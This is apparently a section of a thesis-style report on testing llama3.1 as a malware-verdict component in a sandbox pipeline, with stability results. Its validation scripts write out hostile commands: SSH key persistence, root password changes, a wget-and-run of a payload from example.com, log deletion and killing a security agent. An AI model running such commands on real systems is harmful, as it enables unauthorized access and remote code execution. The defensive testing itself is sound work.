
\subsection{AI Agent-Based Verdict Testing}
\noindent
As discussed in the preceding comparison, \texttt{llama3.1:latest} was selected as
the most suitable model for the AI-based verdict stage. The choice was not based
on a single favorable output, but on the overall balance between severity
calibration, handling of ambiguous cases, and runtime. In particular, it was the
only tested model that consistently treated the stealth and network-oriented
cases in the expected direction while also keeping the legitimate case in the
\textit{Low} range. This made it the most practical candidate for continued use
in the pipeline.

\noindent
Having selected a model, the next step is not merely to compare it against the
other candidates, but to examine how it behaves across a broader set of simple
validation scenarios. The purpose of these follow-up tests is therefore to check
whether the chosen model remains sensible when presented with more narrowly
defined patterns of suspicious behavior, such as credential modification,
persistence, reconnaissance, downloader activity, and combinations of these
signals. Rather than serving as a benchmark between models, this stage acts as a
sanity check on whether the selected AI agent produces outputs that remain
plausible across different script-driven behaviors.


\subsubsection{llama3.1 Validation Scripts}
\noindent
The following scripts were used as compact validation inputs for
\texttt{llama3.1:latest}. Each one represents a small and deliberately readable
behavioral pattern, making it easier to inspect whether the resulting verdict
matches the dominant activity encoded in the script. Some cases isolate a single
signal, while others combine several suspicious actions in order to observe how
the model weighs them together.


\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{account\_takeover.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
echo "root:BadPassword123" | chpasswd

\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{cleanup\_tampering.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
rm -rf /tmp/secure.sh
rm -rf /tmp/auth.sh
echo > /etc/hosts.deny
pkill sleep
\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{combined\_attack.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
uname -a
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
wget http://example.com/payload.sh
chmod +x payload.sh
sh payload.sh
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{defense\_evasion.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
rm -f /tmp/security.log
pkill security_agent




\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{downloader\_persistence.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
wget http://example.com/payload.sh
chmod +x payload.sh
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{downloader.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
wget http://example.com/payload.sh
chmod +x payload.sh
sh payload.sh

\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{miner\_recon.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
cat /proc/cpuinfo | grep name | wc -l
free -m
lscpu
df -h
top -bn1
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{password\_modification.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
echo "root:BadPassword123" | chpasswd




\end{minted}
\end{minipage}

\vspace{1em}

\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{reconnaissance.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
uname -a
whoami
lscpu
free -m
df -h
\end{minted}
\end{minipage}
\hfill
\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
\captionof{listing}{ssh\_persistence.sh}
\vspace{-6mm}
\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
#!/bin/bash
mkdir -p ~/.ssh
echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

\end{minted}
\end{minipage}

\vspace{1em}

The selected validation scripts cover a range of behavioral categories commonly associated with malicious activity, including credential modification, persistence establishment, reconnaissance, payload retrieval, and defense evasion. Several of the scripts are inspired by command sequences observed on a publicly exposed honeypot, while others were constructed to isolate specific behavioral patterns for testing purposes. The goal is not to evaluate the AI agent against a particular malware family, but rather to determine whether it can correctly interpret the underlying behavior represented by the collected execution artifacts.

\vspace{1em}

The validation set intentionally includes both single-purpose scripts and multi-stage attack simulations. Single-purpose scripts make it possible to evaluate whether the model correctly identifies a dominant malicious signal, such as password modification or SSH persistence. In contrast, the combined scripts test whether the model can reason about multiple suspicious actions occurring together and appropriately increase the assessed severity level. The expected outcome is that the AI agent produces consistent assessments that reflect both the type and combination of observed behaviors.

\vspace{1em}

These scripts are executed through the same sandboxing and monitoring pipeline as
the earlier test cases. The intention is therefore not to change the execution
method, but to supply a new set of compact validation inputs while keeping the
artifact-collection process unchanged. After execution, the observed behavior is
saved in the same structured JSON format used throughout the project, and that
report is then passed to the AI wrapper for assessment.

\vspace{1em}

The stored output format captures the main artifact categories relevant to the
verdict, including execution metadata, network activity, filesystem changes, and
captured script output. A simplified representation of the report structure is
shown below:

\begin{minted}[fontsize=\scriptsize,frame=single]{json}
{
  "target_file": "",
  "execution_time": 1,
  "exit_code": 0,
  "network_connections": [],
  "traffic_verdict": [],
  "filesystem_changes": {
    "modified": [],
    "new": [],
    "deleted": []
  },
  "malware_output": {
    "content": "",
    "lines": 0,
    "truncated": false
  }
}
\end{minted}

\noindent
Using the same report structure across both the earlier benchmark cases and these
validation scripts makes the later comparison more meaningful: the model is not
judging the raw script text directly, but the monitored execution artifacts
produced by a consistent reporting pipeline.


\subsubsection{Repeated-Run Stability Test}
\noindent
After defining the validation scripts, an additional stability test was conducted
in order to examine whether the selected model would vary its verdicts across
repeated executions of the same input data. This was relevant because local
language-model inference is not necessarily deterministic in practice, and a
useful verdict component should ideally not fluctuate significantly when the
underlying execution report is unchanged.

\noindent
To test this, the \texttt{llama3.1:latest} model was run five times on the same
set of validation cases. For each run, the resulting severity label and
\texttt{risk\_score} were recorded. Table~\ref{tab:llama31-repeatability}
summarizes the dominant outcome for each script together with the level of
agreement across the repeated runs.


\newpage



\begin{table}[h]
\centering
\footnotesize
\begin{tabular}{lccc}
\hline
\textbf{Script} & \textbf{Repeated result} & \textbf{Avg. score} & \textbf{Agreement} \\
\hline
\texttt{account\_takeover.sh} & Critical & 95 & 5/5 identical \\
\texttt{cleanup\_tampering.sh} & High & 80 & 5/5 identical \\
\texttt{combined\_attack.sh} & High & 80 & 5/5 identical \\
\texttt{defense\_evasion.sh} & Low & 10 & 5/5 identical \\
\texttt{downloader.sh} & Medium & 50 & 5/5 identical \\
\texttt{downloader\_persistence.sh} & Low & 20 & 5/5 identical \\
\texttt{miner\_recon.sh} & Low & 10 & 5/5 identical \\
\texttt{password\_modification.sh} & High & 80 & 5/5 identical \\
\texttt{reconnaissance.sh} & Low & 10 & 5/5 identical \\
\texttt{ssh\_persistence.sh} & High & 80 & 5/5 identical \\
\hline
\end{tabular}
\caption{Repeated-run stability of \texttt{llama3.1:latest} across five executions of the same validation inputs.}
\label{tab:llama31-repeatability}
\end{table}

\noindent
The repeated-run test showed no observable variation in either severity label or
\texttt{risk\_score} across the five executions. In this setting, the model
therefore behaved as effectively deterministic for the tested inputs. This is a
useful practical property, since it suggests that the main source of uncertainty
in the AI-based verdict does not stem from run-to-run instability, but rather
from how well the chosen test cases and persona capture the intended notion of
maliciousness. In other words, the remaining challenge is less about output
randomness and more about calibration of the model against the right behavioral
signals.
